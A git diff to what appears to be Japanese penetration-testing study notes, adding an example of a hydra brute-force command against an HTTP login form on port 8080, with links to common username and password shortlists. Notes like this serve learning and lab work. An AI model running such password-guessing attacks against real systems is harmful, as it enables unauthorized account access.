@@ -1053,6 +1053,21 @@ hydra -l <username or user.txt> -p <password or password.txt> 192.168.56.1 -t 4 
 ・-t は並列処理のタスク数宇
 ```
 
+ex(tcp):
+
+簡単なwordlist を使う
+
+[username](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)
+
+[password](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt)
+
+```
+hydra -L user.txt -P password.txt -s 8080 10.10.12.30 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2Fbuild%2Fadmin&Submit=Sign+in:F=Invalid username or password"
+
+s: port 指定
+
+```
+
 ex (ftp):
 ```
 ・username も password もわからない時。
